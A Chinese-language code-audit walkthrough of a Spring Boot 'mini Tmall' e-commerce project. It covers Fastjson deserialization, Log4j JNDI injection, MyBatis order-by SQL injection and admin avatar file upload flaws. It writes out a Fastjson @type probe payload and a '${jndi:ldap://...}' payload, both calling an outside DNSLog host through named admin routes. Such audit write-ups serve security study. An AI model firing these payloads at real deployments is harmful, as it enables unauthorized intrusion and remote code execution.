一、项目简介

迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程： 
用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。
作 为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管 理和交易额统计等模块，实现了对整个商城的一站式管理和维护。

二、代码审计漏洞挖掘

首先检查pom文件，查看第三方依赖

SpringBoot  2.1.6.RELEASE 

Fastjson  1.2.58 

Mysql  5.1.47 

Druid  1.1.19 

Taglibs 1.2.5 

Mybatis 3.5.1 

Log4j  2.10.0

1.fastjson存在反序列化漏洞

审计fastjson漏洞，重点关注parse函数和parseObject函数
全局搜索这两个函数
<img width="1732" height="864" alt="image" src="https://github.com/user-attachments/assets/bf850270-e1e6-447f-aadf-28b702f4396a" />

来到ProductController层

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/109b6246-eff8-400c-b429-5fbd03faea22" />

在151行使用了parseObject，传入的参数是propertyJson
向上分析，发现是商品属性Json

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/5a5e1c07-7ce8-467c-9436-c4ebbf5c25a2" />

向上分析路由，为admin/product，该项目的起始路由是tmall
所以就是tmall/admin/product，传参为POST型

<img width="1713" height="1470" alt="image" src="https://github.com/user-attachments/assets/a50ae6dc-ac8c-4c60-ab2b-55b2a8b9da84" />

根据路由，来到后台 "所有产品" 处

<img width="2503" height="1468" alt="image" src="https://github.com/user-attachments/assets/385453e7-62dd-43c6-9a03-4ad9528b8b9e" />

点击添加一个产品
随便添点东西，然后保存

<img width="1539" height="1359" alt="image" src="https://github.com/user-attachments/assets/24e7e02f-7986-4c8d-a781-cdab973af1f7" />

获取数据包，找到了propertyJson参数

<img width="1788" height="1461" alt="image" src="https://github.com/user-attachments/assets/e6c92684-2d47-4fe4-a5dd-e34d6488f3d1" />

在propertyJson参数处替换payload
{"@type":"java.net.Inet4Address","val":"4e73f32702.ipv6.1433.eu.org"}

<img width="2559" height="1495" alt="image" src="https://github.com/user-attachments/assets/4dec828f-4ffe-4747-b5da-c069e86c3a58" />

验证成功 存在fastjson漏洞

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/fa92c3cd-3147-463e-add2-c1879caeeb5b" />

在prorertyAddJson处也存在
路由是admin/product/{product_id}

<img width="1788" height="1461" alt="image" src="https://github.com/user-attachments/assets/c21be35f-139b-4c31-beea-ed7adb05df71" />

<img width="1219" height="1351" alt="image" src="https://github.com/user-attachments/assets/dc2feede-1b7e-4884-896a-27aa5e097a25" />

但是试了十几次才成功一次，不知道为啥


2.log4j漏洞

该项目引入了log4j组件，并且该版本存在log4j远程代码执行漏洞
log4j-core是源码，存在该漏洞，而log4j-api则不存在，api是接口

<img width="2314" height="1470" alt="image" src="https://github.com/user-attachments/assets/10522e45-8c82-489a-a6b1-9ad4f208dc43" />

在利用log4j时，必须要找到可利用的拼接参数，如果参数不是由用户控制，那么log4j就利用不了
全局搜索关键字logger

<img width="1732" height="864" alt="image" src="https://github.com/user-attachments/assets/e8abff3a-2b37-49e3-a87e-4b6e398b5e22" />

只有这一个是可控的
来到AccoutController
可控参数是originalFileName
路由为admin/uploadAdminHeadImage
通过注释可以看出是管理员头像上传

<img width="2065" height="1470" alt="image" src="https://github.com/user-attachments/assets/93b3556e-7759-43fc-a696-5fb71c538f32" />

来到后台上传头像

<img width="2211" height="1338" alt="image" src="https://github.com/user-attachments/assets/351fc9b2-2b0e-4fae-9d57-f578443ff420" />

抓包修改filename为payload
${jndi:ldap://91080ff088.ipv6.1433.eu.org}

<img width="1788" height="1461" alt="image" src="https://github.com/user-attachments/assets/b278fd12-7c2e-40da-9405-e61ebaf23371" />

3.SQL注入漏洞

该项目使用的是mybatis框架对数据库进行操作
在java代码中的sql注入，是使用了不安全的拼接方式才会缠上
mybatis中拼接SQL语句的方式有两种，一种是占位符#{  }，一种是拼接符${  }
如果在mapper层中存在使用${  }拼接SQL语句的话，这个地方很可能存在SQL注入漏洞

全局搜索${ 
筛选文件后缀为xml

<img width="1732" height="864" alt="image" src="https://github.com/user-attachments/assets/afb7b714-223a-4a24-95ac-b6ec0db64ba2" />

在mybatis中，表名/字段名

order by/group by

like模糊查询

in

如果有这些方法的话，是没有办法使用预编译#{  }的，那么这里就很可能存在sql注入
随便先来到一处

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/f708b944-55ec-41c6-b872-1b376e3fc229" />

点击绿色箭头跟踪一下，查看谁调用了select

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/c8c0fffd-94bc-418f-8de7-d1ced7bd0edf" />

ctrl+左键继续跟踪，来到Service层

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/a0ad88e3-27d0-413a-925a-d0fd99850b2c" />
现在是getList调用了select
继续跟踪getList来到Controller层

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/44fd6cce-6a44-4fd7-8392-e28af6f3746b" />

web来到所有产品页，点击查询

<img width="1575" height="1498" alt="image" src="https://github.com/user-attachments/assets/a3caf735-29c1-47df-bee4-9a799131dda3" />

获取数据包
根据分析之前的代码，注入点就是在orderby处了

<img width="1788" height="1461" alt="image" src="https://github.com/user-attachments/assets/cfd15f81-739b-48c9-b464-5d7bbb076065" />

<img width="1711" height="822" alt="image" src="https://github.com/user-attachments/assets/e6092c95-cbb6-4007-b5e3-1ae066e55678" />

验证成功
存在SQL注入漏洞

4.任意文件上传漏洞

对于springboot搭建的项目来说，是默认不解析jsp的，如果springboot项目存在任意文件上传
那么上传了jsp也利用不了，因为不解析，只能通过内存码的方式进行攻击了。
但是在本项目引入了对jsp的解析依赖，就可以对jsp进行解析

<img width="910" height="180" alt="image" src="https://github.com/user-attachments/assets/cedae69c-7e1b-479f-b471-3ca4a65944a6" />
来到后台管理员头像上传处

<img width="1726" height="1461" alt="image" src="https://github.com/user-attachments/assets/bb237d82-debf-4b2a-afc4-fdf9a8364b31" />

全局搜索路由/admin/uploadAdminHeadImage ，来到Controller层代码处

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/5da68786-1216-406f-80aa-f8d89cbc83d1" />

首先定义方法uploadAdminHeadImage接收形参file和session

file.getOriginalFilename()获取文件名，传给 originalFileName

UUID生成随机文件名

获取上传路径 res/images/item/adminProfilePicture + fileName

<img width="1788" height="1461" alt="image" src="https://github.com/user-attachments/assets/85bfbe27-8dab-457e-bc71-ef05514b96b2" />

<img width="733" height="780" alt="image" src="https://github.com/user-attachments/assets/1c4e15b2-2261-452d-bb29-fd43abbe511a" />




